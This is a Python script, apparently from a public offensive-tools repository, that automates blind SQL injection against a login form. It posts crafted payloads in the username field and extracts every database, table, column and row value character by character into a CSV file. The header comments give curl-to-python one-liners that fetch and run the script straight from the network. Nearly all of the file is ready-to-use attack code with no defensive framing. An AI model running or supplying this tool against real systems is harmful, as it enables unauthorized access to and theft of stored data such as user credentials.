#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para usar error-based SQLi para dumpear una base de datos de una URL específica
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 -
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | sed 's-sudo--g' | python3 -
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | nano -
# ----------

# Requisitos: # python3 -m pip install --user x --break-system-packages

import requests
import argparse
import csv
from urllib.parse import urlparse

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="URL del login vulnerable (ej: http://10.10.10.10/login)")
parser.add_argument("--max", type=int, default=10, help="Máximo de elementos por nivel")
parser.add_argument("--success", default="Bienvenido", help="Texto que indica autenticación exitosa")
args = parser.parse_args()

url = args.url
max_enum = args.max
success_indicator = args.success

def send_payload(condition):
  payload = f"' AND ({condition}) -- -"
  r = requests.post(url, data={"username": payload, "password": "x"})
  return success_indicator in r.text

def extract_char(query, pos):
  for c in range(32, 127):
    if send_payload(f"ASCII(SUBSTRING(({query}),{pos},1))={c}"):
      return chr(c)
  return None

def extract_string(query, max_len=40):
  result = ""
  for pos in range(1, max_len + 1):
    ch = extract_char(query, pos)
    if ch is None:
      break
    result += ch
  return result

# CSV
host = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{host}.csv"
csvf = open(csv_file, "w", newline="", encoding="utf-8")
csvw = csv.writer(csvf)
csvw.writerow(["Database", "Table", "Column", "RowIndex", "Value"])

for db_i in range(max_enum):
  db = extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db: break
  print(f"\n[DB] {db}")
  for tb_i in range(max_enum):
    table = extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table: break
    print(f"  [TABLE] {table}")
    cols = []
    for col_i in range(max_enum):
      col = extract_string(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {col_i},1")
      if not col: break
      print(f"    [COL] {col}")
      cols.append(col)
    for row_i in range(max_enum):
      found = False
      for col in cols:
        val = extract_string(f"SELECT {col} FROM {db}.{table} LIMIT {row_i},1")
        if val:
          print(f"      [row {row_i}] {col}: {val}")
          csvw.writerow([db, table, col, row_i, val])
          found = True
      if not found:
        break

csvf.close()
print(f"\n CSV guardado en {csv_file}")
